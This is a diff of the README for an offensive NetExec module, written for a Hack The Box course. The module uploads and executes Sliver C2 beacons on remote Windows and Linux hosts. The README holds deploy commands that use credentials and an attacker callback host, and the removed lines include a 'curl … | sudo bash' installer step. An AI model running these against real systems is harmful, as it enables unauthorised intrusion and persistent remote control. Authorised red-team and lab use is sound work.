@@ -1,94 +1,56 @@
-
 # Sliver NetExec Module
 
 [![](https://github.com/moerketh/sliver-netexec-module/actions/workflows/test.yml/badge.svg?branch=main)](https://github.com/moerketh/sliver-netexec-module/actions/workflows/test.yml)
 
-
-This is a NetExec (formerly CrackMapExec) module that generates unique Sliver beacons and executes them on remote Windows/Linux targets via SMB.
-
-## What it does
-
-The `sliver_exec` module:
-- Connects to a Sliver C2 server
-- Generates unique implant beacons for target systems
-- Uploads the implants to remote targets using SMB
-- Executes the implants to establish persistent C2 beacons (Windows-only)
-- Optionally waits for beacon check-in and cleans up artifacts
+A NetExec module that deploys Sliver C2 implants to remote Windows and Linux targets via SMB, WinRM, SSH, and MSSQL protocols.
 
 ## Features
 
-- Automatic OS and architecture detection
-- Support for Windows and Linux targets
-- Unique implant generation per execution
-- Configurable cleanup and timeout options
-- Direct SMB upload
+- **Multi-Protocol Support**: SMB, WinRM, SSH, MSSQL
+- **Automatic OS/Architecture Detection**: Detects from connection metadata
+- **Unique Implants**: Generates unique implant per target
+- **Configurable Options**: Beacon intervals, cleanup, wait times, staging methods
+- **Profile Support**: Use pre-configured Sliver profiles for consistent deployments
+- **Cross-Platform**: Deploy to Windows and Linux targets
 
 ## Requirements
 
 - NetExec (nxc) installed
-- Sliver C2 server running
+- Sliver C2 server running (v1.6+)
 - Valid Sliver client configuration
-- sliver-py Python package
+- Target credentials (Windows: admin, Linux: root/sudo, MSSQL: sysadmin)
 
-## Installation on HTB PwnBox
+## Quick Install
 
 ```bash
-# Remove pip-installed netexec
-sudo pip3 uninstall -yqq netexec
-
-# Install netexec via pipx + Sliver SDK
-sudo apt install -y pipx git
-pipx ensurepath
-pipx install git+https://github.com/Pennyw0rth/NetExec
-pipx inject netexec sliver-py
-
-# Install Sliver
-curl https://sliver.sh/install | sudo bash
-cp .sliver-client/configs/${USER}_localhost.cfg .sliver-client/configs/default.cfg
-
-# Tip: Add a bypass to proxychains to be able to reach the Sliver Server
-echo "localnet 127.0.0.0/255.0.0.0" | sudo tee -a /etc/proxychains.conf
+./scripts/install.sh
 ```
 
-## Usage
+For detailed installation instructions, see [Installation Guide](docs/INSTALLATION.md).
 
-### Basic usage:
-Command
+## Quick Start
+
+Deploy a Sliver implant via SMB:
+
 ```bash
-nxc smb 10.2.10.10 10.2.10.11 10.2.10.12 -u localuser -p password -M sliver_exec -o RHOST=192.168.1.100 RPORT=443
+nxc smb 10.2.10.10 -u localuser -p password \
+  -M sliver_exec \
+  -o RHOST=192.168.1.100
 ```
-Output:
 
 ![](./assets/example.svg)
 
-### Available options:
-- `RHOST`: Target IP address (required)
-- `RPORT`: Sliver listener port (default: 443)
-- `OS`: Target OS (windows/linux, auto-detected if not specified)
-- `ARCH`: Target architecture (amd64/386, auto-detected if not specified)
-- `IMPLANT_BASE_PATH`: Local base path for temp files (default: /tmp)
-- `CLEANUP`: Remove implant after execution (default: True)
-- `WAIT`: Seconds to wait for beacon check-in (default: 30)
-- `FORMAT`: Implant format (default: exe, only exe supported)
+See [Usage Guide](docs/USAGE.md) for more examples and options.
 
-## Configuration
+## Documentation
 
-The module requires a Sliver client configuration file. By default, it looks for:
-- `~/.sliver-client/configs/default.cfg`
+- **[Installation Guide](docs/INSTALLATION.md)** - Setup instructions for all platforms
+- **[Usage Guide](docs/USAGE.md)** - Comprehensive examples and configuration options
+- **[Architecture](docs/ARCHITECTURE.md)** - Technical details and deployment modes
+- **[Testing Guide](docs/TESTING.md)** - Unit, E2E, and integration tests
 
-You can specify a custom config path in your NetExec config under the `[Sliver]` section:
-```ini
-[Sliver]
-config_path = /path/to/your/sliver/config.cfg
-```
+## Credits
 
-## Information
+This module was written as part of the **Active Directory Penetration Expert Course** on Hack The Box.
 
-This module was written as an exercise as part of the CrackMapExec course in the **Active Directory Penetration Expert Course** on Hack The Box.
-
-## Testing
-
-Run the test suite:
-```bash
-python -m pytest tests/
-```
+Developed with assistance from AI coding assistants: Claude (Anthropic) and Grok (xAI).
